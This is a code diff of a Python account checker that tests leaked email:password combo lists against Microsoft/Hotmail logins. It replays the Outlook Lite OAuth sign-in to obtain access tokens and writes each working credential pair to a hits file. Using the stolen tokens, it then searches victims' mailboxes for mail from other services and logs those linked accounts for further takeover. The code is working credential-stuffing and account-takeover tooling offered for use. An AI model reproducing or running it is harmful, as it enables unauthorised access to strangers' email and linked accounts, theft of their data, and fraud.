@@ -198,21 +198,28 @@ def get_imap_server(domain):
 
 # --- Checker Logic ---
 def get_capture(email, password, access_token, cid, selected_service=None, session_id=None):
+    """Search for linked accounts in email - Remade from 3.py"""
     global service_hits
     try:
         # Always save to general Hits_All.txt first
         all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
         os.makedirs(os.path.dirname(all_hits_path), exist_ok=True)
         with lock:
+            if not os.path.exists(all_hits_path):
+                with open(all_hits_path, 'w', encoding='utf-8') as f:
+                    f.write(f"# Successful Logins\n\n")
             with open(all_hits_path, 'a', encoding='utf-8') as f:
                 f.write(f"{email}:{password}\n")
-        
+
         search_url = "https://outlook.live.com/search/api/v2/query"
-        services_to_check = {selected_service: SERVICES[selected_service]} if selected_service else SERVICES
+        
+        # Determine which services to check
+        services_to_check = {selected_service: SERVICES[selected_service]} if selected_service and selected_service != "IMAP_CHECKER" else SERVICES
         
         for service_name, service_info in services_to_check.items():
             if stop_checking: break
             sender = service_info["sender"]
+            
             payload = {
                 "Cvid": str(uuid.uuid4()),
                 "Scenario": {"Name": "owa.react"},
@@ -228,34 +235,48 @@ def get_capture(email, password, access_token, cid, selected_service=None, sessi
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                 }]
             }
+            
             headers = {
                 'Authorization': f'Bearer {access_token}',
                 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json'
             }
+            
             try:
                 r = requests.post(search_url, json=payload, headers=headers, timeout=10)
                 if r.status_code == 200:
                     data = r.json()
-                    if 'EntitySets' in data and data['EntitySets']:
+                    if 'EntitySets' in data and len(data['EntitySets']) > 0:
                         entity_set = data['EntitySets'][0]
-                        if 'ResultSets' in entity_set and entity_set['ResultSets']:
+                        if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                             result_set = entity_set['ResultSets'][0]
-                            if result_set.get('Total', 0) > 0:
+                            total = result_set.get('Total', 0)
+                            if total > 0:
+                                # Service found! Save to file
                                 output_path = os.path.join(HITS_DIR, session_id, service_info["file"])
                                 os.makedirs(os.path.dirname(output_path), exist_ok=True)
+                                
+                                # Create file with header if it doesn't exist
                                 with lock:
+                                    if not os.path.exists(output_path):
+                                        with open(output_path, 'w', encoding='utf-8') as f:
+                                            f.write(f"# Linked accounts found\n\n")
+                                    
+                                    # Append account
                                     with open(output_path, 'a', encoding='utf-8') as f:
                                         f.write(f"{email}:{password}\n")
-                                    service_hits[service_name] = service_hits.get(service_name, 0) + 1
-                else:
-                    # Log failure to console for debugging
-                    print(f"Search API error ({r.status_code}) for {email} / {service_name}")
-            except Exception as e:
-                print(f"Search error for {email} / {service_name}: {e}")
+                                    
+                                    # Update counter
+                                    if service_name not in service_hits:
+                                        service_hits[service_name] = 0
+                                    service_hits[service_name] += 1
+                
+                time.sleep(0.1)  # Small delay between searches
+            except:
                 continue
+                
     except Exception as e:
-        print(f"General capture error for {email}: {e}")
+        print(f"Capture error for {email}: {e}")
 
 def _build_imap_or_query(senders):
     if not senders:
@@ -335,13 +356,14 @@ def check_imap(email, password, session_id):
         return "RETRY"
 
 def check_account(email, password, selected_service=None, session_id=None):
+    """Check hotmail account - Remade from 3.py"""
     # Determine check mode
     if selected_service == "IMAP_CHECKER":
         return check_imap(email, password, session_id)
     
-    # Existing Hotmail check logic
     try:
         session = requests.Session()
+        
         url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
         headers1 = {
             "X-OneAuth-AppName": "Outlook Lite",
@@ -352,43 +374,90 @@ def check_account(email, password, selected_service=None, session_id=None):
             "Connection": "Keep-Alive",
             "Accept-Encoding": "gzip"
         }
+        
         r1 = session.get(url1, headers=headers1, timeout=15)
-        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
+        
+        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
+            return "BAD"
+        if "MSAccount" not in r1.text:
             return "BAD"
         
         time.sleep(0.3)
         url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
+        
+        r2 = session.get(url2, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "keep-alive"
+        }, allow_redirects=True, timeout=15)
         
         url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
         ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
-        if not url_match or not ppft_match: return "BAD"
+        
+        if not url_match or not ppft_match:
+            return "BAD"
         
         post_url = url_match.group(1).replace("\\/", "/")
         ppft = ppft_match.group(1)
+        
         login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
         
-        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", "Origin": "https://login.live.com"}, allow_redirects=False, timeout=15)
-        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials", "identity/confirm", "Abuse", "signedout", "locked"]):
+        r3 = session.post(post_url, data=login_data, headers={
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Origin": "https://login.live.com",
+            "Referer": r2.url
+        }, allow_redirects=False, timeout=15)
+        
+        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
+            return "BAD"
+        
+        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
             return "BAD"
             
         location = r3.headers.get("Location", "")
+        if not location:
+            return "BAD"
+        
         code_match = re.search(r'code=([^&]+)', location)
-        if not code_match: return "BAD"
+        if not code_match:
+            return "BAD"
         
         code = code_match.group(1)
-        token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
+        
+        token_data = {
+            "client_info": "1",
+            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+            "grant_type": "authorization_code",
+            "code": code,
+            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+        }
+        
         r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
         
-        if r4.status_code != 200 or "access_token" not in r4.text: return "BAD"
+        if r4.status_code != 200 or "access_token" not in r4.text:
+            return "BAD"
         
-        access_token = r4.json()["access_token"]
-        mspcid = next((c.value for c in session.cookies if c.name == "MSPCID"), None)
+        token_json = r4.json()
+        access_token = token_json["access_token"]
+        
+        mspcid = None
+        for cookie in session.cookies:
+            if cookie.name == "MSPCID":
+                mspcid = cookie.value
+                break
         cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
         
         get_capture(email, password, access_token, cid, selected_service, session_id)
         return "HIT"
-    except: return "RETRY"
+        
+    except requests.exceptions.Timeout:
+        return "RETRY"
+    except Exception as e:
+        return "RETRY"
+
 
 def check_combo_wrapper(line, selected_service, session_id):
     global hit, bad, retry, processed, checked_accounts
